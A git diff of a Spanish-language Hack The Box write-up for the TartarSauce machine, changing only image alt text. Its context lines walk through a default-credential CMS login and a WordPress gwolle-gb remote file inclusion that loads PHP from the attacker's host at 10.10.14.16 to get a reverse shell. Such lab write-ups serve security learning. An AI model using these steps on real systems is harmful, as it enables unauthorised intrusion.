@@ -93,21 +93,21 @@ http://10.10.10.88 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPSe
 
 Podríamos visualizar vía web pero no nos dice nada interesante:
 
-![](/assets/images/htb-tartarsauce/tartarsauce_web.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_web.png)
 
 También podríamos el código fuente de la página, pero adelanto que no vamos a encontrar nada de interés como atacantes. De acuerdo con la información obtenida de `nmap`, vemos que existen recursos en la máquina, así que vamos a ingresar a estos y checar su contenido.
 
 En el recurso `/webservices/monstra-3.0.4/` vemos el uso del gestor de contenido *Monstra* de versión 3.0.4 de la cual existen algunas vulnerabilidades que nos permitiría subir un archivo php pero necesitamos estar autenticados.
 
-![](/assets/images/htb-tartarsauce/tartarsauce_monstra.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_monstra.png)
 
 En la sección de **Getting Started** vemos un apartado que indica **Go to the Pages Manager and click "Edit" button for this page**, el damos click ahí y nos encontramos con el panel de login del CMS.
 
-![](/assets/images/htb-tartarsauce/tartarsauce_login.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_login.png)
 
 Podríamos tratar de acceder con credenciales por defecto ***admin:admin*** y vemos que tenemos acceso.
 
-![](/assets/images/htb-tartarsauce/tartarsauce_upload.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_upload.png)
 
 De las opciones que tenemos y que más nos podrían interesar sería **Upload File**. Adelantando un poco, no tenemos permisos para subir archivo al CMS, de ningún tipo; por lo que los exploits relacionados NO nos servirían.
 
@@ -139,13 +139,13 @@ Requests/sec.: 0
 
 Vemos que existe el recurso llamado `wp` dentro de `webservices`; así que vamos a validarlo.
 
-![](/assets/images/htb-tartarsauce/tartarsauce_wp.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_wp.png)
 
 Vemos el uso de la tecnología *WordPress* el cual debería tener su panel de administración en `wp-admin` o `wp-login`. Al tratar de acceder al recurso, vemos que nos redirecciona a `https://tartarsauce.htb/`, por lo tanto, agregamos el dominio en nuestro archivo `/etc/hosts`. Recargando la página http://tartarsauce.htb/webservices/wp/, podemos ver un formato más bonito.
 
-![](/assets/images/htb-tartarsauce/tartarsauce_wp2.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_wp2.png)
 
-![](/assets/images/htb-tartarsauce/tartarsauce_wp3.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_wp3.png)
 
 Podríamos probar credenciales por defecto; sin embargo, vemos que no tenemos éxito para acceder al panel de administración de *WordPress*. Pensando un poco, *WordPress* maneja plugins que algunos podrían presentar alguna vulnerabilidad que podamos aprovechar; así que vamos a buscar algunos plugins mediante la herramienta `wfuzz` y un direccionario de **SecLists**:
 
@@ -236,7 +236,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Ahora ingresamos a la siguiente dirección URL y vemos nuestra nuestro archivo:
 - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.16/
 
-![](/assets/images/htb-tartarsauce/tartarsauce_php.png)
+![""](/assets/images/htb-tartarsauce/tartarsauce_php.png)
 
 Asi que vamos a crearnos una reverse shell, nos ponemos en escucha por el puerto 443 y accedemos a la direccion URL http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.16/
 
